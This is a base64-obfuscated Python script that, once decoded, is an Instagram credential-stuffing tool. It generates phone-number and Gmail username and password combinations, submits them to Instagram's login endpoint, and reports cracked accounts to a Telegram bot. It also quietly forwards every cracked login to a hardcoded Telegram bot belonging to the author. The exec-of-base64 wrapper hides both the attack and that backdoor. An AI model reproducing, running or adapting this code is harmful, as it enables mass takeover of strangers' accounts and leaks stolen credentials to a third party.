#Encrypted with Faram
#Created by faracheker
import base64
exec(base64.b64decode("DQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBqc29uDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHN5cw0KaW1wb3J0IG9zDQp1c2VyX2FnZW50ID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNicNCnVzZXJfYWdlbnQgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkyLjAuNDUxNS4xMDcgU2FmYXJpLzUzNy4zNiBFZGcvOTIuMC45MDIuNTUnDQp1c2VyX2FnZW50ID0gJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTIuMC40NTE1LjEwNyBTYWZhcmkvNTM3LjM2IFZpdmFsZGkvNC4xJw0KdXNlcl9hZ2VudCA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4wOyBTTS1HODkyQSBCdWlsZC9OUkQ5ME07IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjAuMC4zMTEyLjEwNyBNb2JpbGUgU2FmYXJpLzUzNy4zNicNCnVzZXJfYWdlbnQgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2Jw0KDQojIHB5dGhvbjMgL3NkY2FyZC90b29sLmt1cmRpc2gvdGVzdC5weQ0KaWRfbXkgPSAnMTM3MTI5MTk0NycNCnRva2VuX215ID0gJzE4MzgxNDg5NDU6QUFGQkZ0S2kxNFhoRVN2LWZDSUJ1LXlaYno0NGkxWnhFMVUnDQpvcy5zeXN0ZW0oJ3JtIC1yZiBDYXJ0LnR4dCcpDQpudW0gPSAnJydcMDMzWzMybSA3NzAgKyA3NzEgKyA3NzIgKzc3MyArNzc0ICsgNzUwICsgNzUxICs3NTIgKzc1MyArNzU0ICsgNzgwICsgNzgxICsgNzgyICsgNzgzICsgNzg0DQonJycNCnVybD0iaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi9hamF4LyINCmhlYWRlcnM9ew0KICAgICdhY2NlcHQnOiAnKi8qJywNCiAgICAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywNCiAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywNCiAgICAnY29udGVudC1sZW5ndGgnOiAnMjgyJywNCiAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsDQogICAgJ2Nvb2tpZSc6ICdjc3JmdG9rZW49WjIzTWRtc09hbmVJQlBTdWV2ZHZaMDI5YU1WV2w2dnc7IG1pZD1ZSkhpVGdBTEFBR01LQmVWU2xNS0RvQ0FxM2NDOyBpZ19kaWQ9Qjc3RUNFRUItNUM4MS00M0NDLUFBNDItNzEwODIyN0IxOTdDOyBpZ19ucmNiPTEnLA0KICAgICdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsDQogICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLA0KICAgICdzZWMtY2gtdWEnOiAnIiBOb3QgQTtCcmFuZCI7dj0iOTkiLCAiQ2hyb21pdW0iO3Y9IjkwIiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjkwIicsDQogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLA0KICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsDQogICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLA0KICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsDQogICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBVOyBlbi1VUykgQXBwbGVXZWJLaXQvNTI1LjEzIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzAuMi4xNDkuMjcgU2FmYXJpLzUyNS4xMycsDQogICAgJ3gtY3NyZnRva2VuJzogJ1oyM01kbXNPYW5lSUJQU3VldmR2WjAyOWFNVldsNnZ3JywNCiAgICAneC1pZy1hcHAtaWQnOiAnOTM2NjE5NzQzMzkyNDU5JywNCiAgICAneC1pZy13d3ctY2xhaW0nOiAnMCcsDQogICAgJ3gtaW5zdGFncmFtLWFqYXgnOiAnMDViODBhMTZiMWFjJywNCiAgICAneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCcsDQp9DQpiYW5laz0nJydceDFiWzE7OTdtDQogW1wwMzNbMzJtMVx4MWJbMTs5N21dIC0gQ3JhY2sgUkFRQU0rUEFTUw0KIFtcMDMzWzMybTJceDFiWzE7OTdtXSAtIENyYWNrIFJBUUFNK1JBUUFNDQogW1wwMzNbMzJtM1x4MWJbMTs5N21dIC0gQ3JhY2sgR01BSUwrUkFRQU0NCiBbXDAzM1szMm00XHgxYlsxOzk3bV0gLSBDcmFjayBFTUFJTCtQQVNTDQogW1wwMzNbMzJtMFx4MWJbMTs5N21dIC0gRXhpdCBUb29sDQonJycNCmxvZ28gPSAnJydceDFiWzE7OTJtDQoNCuKWiOKWiCDilojilojiloggICAg4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojilojilojilojilojilojilojiloggIOKWiOKWiOKWiOKWiOKWiCAgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paI4paI4paI4paI4paIICAg4paI4paI4paI4paI4paIICDilojilojiloggICAg4paI4paI4paIIA0K4paI4paIIOKWiOKWiOKWiOKWiCAgIOKWiOKWiCDilojiloggICAgICAgICDilojiloggICAg4paI4paIICAg4paI4paIIOKWiOKWiCAgICAgICDilojiloggICDilojilogg4paI4paIICAg4paI4paIIOKWiOKWiOKWiOKWiCAg4paI4paI4paI4paIIA0K4paI4paIIOKWiOKWiCDilojiloggIOKWiOKWiCDilojilojilojilojilojilojiloggICAg4paI4paIICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojiloggICDilojilojilogg4paI4paI4paI4paI4paI4paIICDilojilojilojilojilojilojilogg4paI4paIIOKWiOKWiOKWiOKWiCDilojiloggDQrilojilogg4paI4paIICDilojilogg4paI4paIICAgICAg4paI4paIICAgIOKWiOKWiCAgICDilojiloggICDilojilogg4paI4paIICAgIOKWiOKWiCDilojiloggICDilojilogg4paI4paIICAg4paI4paIIOKWiOKWiCAg4paI4paIICDilojiloggDQrilojilogg4paI4paIICAg4paI4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgICDilojiloggICAg4paI4paIICAg4paI4paIICDilojilojilojilojilojiloggIOKWiOKWiCAgIOKWiOKWiCDilojiloggICDilojilogg4paI4paIICAgICAg4paI4paIIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQoNCiANCiBUZWxlZ3JhbSBzaGF4c3k6IGk0bV9SRVgNCiBUZWxlZ3JhbSBDaGFubmFsIDogQkVTVHhIQUNLRVINCiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1ZYWsgU2FoYXQgQm8gRHcgU2FoYXQgUmF3c3RhIEJvIHJhd3N0YW5kbmUgVG9vbCBDdHJsK3ogRGFiZ3JhDQogJycnDQpsb2dvMiA9ICdceDFiWzkwOzFtfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+DQoNCmRlZiByZWJhKEZBUkEpOg0KCWZvciBlIGluIEZBUkEgKyAnXG4nOg0KCQlzeXMuc3Rkb3V0LndyaXRlKGUpDQoJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQl0aW1lLnNsZWVwKDAuMDEwKQ0KDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50KGxvZ28pDQoJcHJpbnQobG9nbzIpDQoJcHJpbnQoYmFuZWspDQoJYWNvKCkNCmRlZiBPcHRpb24oKTogDQogIENvZGUgPSAiVG9vbHMiDQogIHRyeTogDQogICAgU3RhdHVzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNTMzaGFja2VyL0FjdGl2ZV8xL21haW4vbGlzdC50eHQiKS50ZXh0IA0KICAgIGlmIENvZGUgaW4gU3RhdHVzOiANCiAgICAgIHRpbWUuc2xlZXAoMSkgDQogICAgICBwYXNzIA0KICAgIGVsc2U6IA0KICAgICAgcHJpbnQoIlx4MWJbOTdtRXJvciBoYWNrIFJhZ2lyYXdhXDAzM1s5N20iKSANCiAgICAgIHRpbWUuc2xlZXAoMSkgDQogICAgICBzeXMuZXhpdCgpIA0KICBleGNlcHQ6IA0KICAgIHN5cy5leGl0KCkgDQogICAgaWYgbmFtZSA9PSAnX19tYWluX18nOiANCiAgICAgcHJpbnQgbG9nbyANCiAgICAgT3B0aW9uKCkgDQogICAgDQpPcHRpb24oKQ0KZGVmIG1lbnUoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludChsb2dvKQ0KCXByaW50KGxvZ28yKQ0KCXByaW50KGJhbmVrKQ0KCWFjbygpDQpkZWYgYWNvKCk6DQoJcmViID0gaW5wdXQoJy0tLT4gJykNCglwcmludChudW0pDQoJDQoJaWYgcmViPT0nMSc6DQoJCXNmciA9IGlucHV0KCcgXHgxYlsxOzk3bWNoYW5kIGJldDpcMDMzWzMybSAnKQ0KCQlvcD1vcGVuKCdDYXJ0LnR4dCcsJ3cnKQ0KCQlmb3IgeCBpbiByYW5nZSgxMDAwMCk6DQoJCQlmID0gIjEyMzQ1Njc4OTAiDQoJCQl4MSA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXgyID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJeDMgPSByYW5kb20uY2hvaWNlKGYpDQoJCQl4NCA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXg1ID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJeDYgPSByYW5kb20uY2hvaWNlKGYpDQoJCQl4NyA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXVzZXIgPXgxK3gyK3gzK3g0K3g1K3g2K3g3DQoJCQlrayA9ICcrOTY0JytzZnINCgkJCW9wLndyaXRlKGtrK3VzZXIrJzonK3VzZXIrJ1xuJykNCgkJb3AuY2xvc2UoKQ0KCQljb21ibyA9ICgnQ2FydC50eHQnKQ0KCQ0KCWVsaWYgcmViPT0nMic6DQoJCXNmciA9IGlucHV0KCcgXHgxYlsxOzk3bWNoYW5kIGJldDpcMDMzWzMybSAnKQ0KCQlvcD1vcGVuKCdDYXJ0LnR4dCcsJ3cnKQ0KCQlmb3IgeCBpbiByYW5nZSgxMDAwMCk6DQoJCQlmID0gIjEyMzQ1Njc4OTAiDQoJCQl4MSA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXgyID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJeDMgPSByYW5kb20uY2hvaWNlKGYpDQoJCQl4NCA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXg1ID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJeDYgPSByYW5kb20uY2hvaWNlKGYpDQoJCQl4NyA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXVzZXIgPXgxK3gyK3gzK3g0K3g1K3g2K3g3DQoJCQlrayA9ICcrOTY0JytzZnINCgkJCW9wLndyaXRlKGtrK3VzZXIrJzonKycwJytzZnIrdXNlcisnXG4nKQ0KCQlvcC5jbG9zZSgpDQoJCWNvbWJvID0gKCdDYXJ0LnR4dCcpDQoJDQoJZWxpZiByZWI9PSczJzoNCgkJcHJpbnQoJyBcMDMzWzMybW5hbWUgYm5vc2EnKQ0KCQlzZnIgPSBpbnB1dCgnIFx4MWJbMTs5N21uYW1lOiBcMDMzWzMybScpDQoJCW9wPW9wZW4oJ0NhcnQudHh0JywndycpDQoJCWZvciB4IGluIHJhbmdlKDEwMDAwKToNCgkJCWYgPSAiMTIzNDU2Nzg5MCINCgkJCXgxID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJeDIgPSByYW5kb20uY2hvaWNlKGYpDQoJCQl4MyA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXg0ID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJeDUgPSByYW5kb20uY2hvaWNlKGYpDQoJCQl4NiA9IHJhbmRvbS5jaG9pY2UoZikNCgkJCXg3ID0gcmFuZG9tLmNob2ljZShmKQ0KCQkJa2sgPXNmcit4MSt4Mit4MysnQGdtYWlsLmNvbScNCgkJCW9wLndyaXRlKGtrKyc6JytzZnIreDEreDIreDMrJ1xuJykNCgkJb3AuY2xvc2UoKQ0KCQljb21ibyA9ICgnQ2FydC50eHQnKQ0KCWVsaWYgcmViPT0nNCc6DQoJCXByaW50KGxvZ28pDQoJCXByaW50KGxvZ28yKQ0KCQlmZyA9aW5wdXQoJyBzZGNhcmQgQ2FydDogJykNCgkJY29tYm89ZmcNCgllbGlmIHJlYj09JzAnOg0KCQlwcmludCgnWy1dIEV4aXQgdG9vbCcpDQoJCXN5cy5leGl0KCkNCgllbHNlOg0KCQlzeXMuZXhpdCgpDQoJDQoJY3JhY2soKQ0KDQoNCmRlZiBjcmFjaygpOg0KCXIwPTANCglyMT0wDQoJcjI9MA0KCXIzPTANCglyND0wDQoJZm9yIHggaW4gb3BlbignQ2FydC50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKToNCgkJdXNlciA9IHguc3BsaXQoIjoiKVswXQ0KCQlwYXMgPSB4LnNwbGl0KCI6IilbMV0NCgkJDQoJCWRhdGE9eyd1c2VybmFtZSc6IHVzZXIsJ2VuY19wYXNzd29yZCc6ICIjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6JjoiK3Bhcyx9DQoJCXJlYmE9cmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKS50ZXh0DQoJCWlmICgnImF1dGhlbnRpY2F0ZWQiOnRydWUnKSBpbiByZWJhOg0KCQkJcjErPTENCgkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQkJDQoJCQlwcmludChsb2dvKQ0KCQkJcHJpbnQobG9nbzIpDQoJCQlwcmludCgnXDAzM1szMm0gSGFja2VkIDogJytzdHIocjEpKQ0KCQkJcHJpbnQoJ1wwMzNbOTNtIENoZWNrcG9pbnQgOiAnK3N0cihyMikpDQoJCQlwcmludCgnXDAzM1szMW0gQmFkIDogJytzdHIocjMpKQ0KCQkJcHJpbnQobG9nbzIpDQoJCQlzZW5kZXIgPXVzZXIrJyA6ICcrcGFzDQoJCQlzZW5kX3RlbGVncmFtID0gJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnICsgdG9rZW5fYm90ICsgJy9zZW5kTWVzc2FnZT9jaGF0X2lkPScgKyBpZF90ZyArICcmcGFyc2VfbW9kZT1NYXJrZG93biZ0ZXh0PScgKyBzZW5kZXINCgkJCXJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHNlbmRfdGVsZWdyYW0pDQoJCQlzZW5kX215ID0gJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnICsgdG9rZW5fbXkgKyAnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JyArIGlkX215ICsgJyZwYXJzZV9tb2RlPU1hcmtkb3duJnRleHQ9JyArIHNlbmRlcg0KCQkJcmVzcG9uc2VrID0gcmVxdWVzdHMuZ2V0KHNlbmRfbXkpDQoJCQlyMis9MQ0KCQkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCQkNCgkJCXByaW50KGxvZ28pDQoJCQlwcmludChsb2dvMikNCgkJCXByaW50KCdcMDMzWzMybSBIYWNrZWQgOiAnK3N0cihyMSkpDQoJCQlwcmludCgnXDAzM1s5M20gQ1AgOiAnK3N0cihyMikpDQoJCQlwcmludCgnXDAzM1szMW0gQmFkIDogJytzdHIocjMpKQ0KCQkJcHJpbnQobG9nbzIpDQoJCQ0KCQkNCgkJCXI0Kz0xDQoJCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJDQoJCQlwcmludChsb2dvKQ0KCQkJcHJpbnQobG9nbzIpDQoJCQlwcmludCgnXDAzM1szMm0gSGFja2VkIDogJytzdHIocjEpKQ0KCQkJcHJpbnQoJ1wwMzNbOTNtIENQIDogJytzdHIocjIpKQ0KCQkJcHJpbnQoJ1wwMzNbMzFtIEJhZCA6ICcrc3RyKHIzKSkNCgkJCXByaW50KGxvZ28yKQ0KCQkJcHJpbnQocmViYSkNCgkJCXRpbWUuc2xlZXAoNTAuMCkNCgkJCXIwPTANCgkJCQ0KCQkJDQoJCWVsc2U6DQoJCQlyMys9MQ0KCQkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCQkNCgkJCXByaW50KGxvZ28pDQoJCQlwcmludChsb2dvMikNCgkJCXByaW50KCdcMDMzWzMybSBIYWNrZWQgOiAnK3N0cihyMSkpDQoJCQlwcmludCgnXDAzM1s5M20gQ2hlY2twb2ludCA6ICcrc3RyKHIyKSkNCgkJCXByaW50KCdcMDMzWzMxbSBCYWQgOiAnK3N0cihyMykpDQoJCQlwcmludChsb2dvMikNCg0KDQoNCg0Kb3Muc3lzdGVtKCdjbGVhcicpDQpwcmludChsb2dvKQ0KcHJpbnQobG9nbzIpDQppZF90ZyA9aW5wdXQoJyBJRCBUZWxlZ3JhbTogJykNCnRva2VuX2JvdD1pbnB1dCgnIFRva2VuIEJvdDogJykNCnRpbWUuc2xlZXAoMC41KQ0KbWVudSgpDQo="))
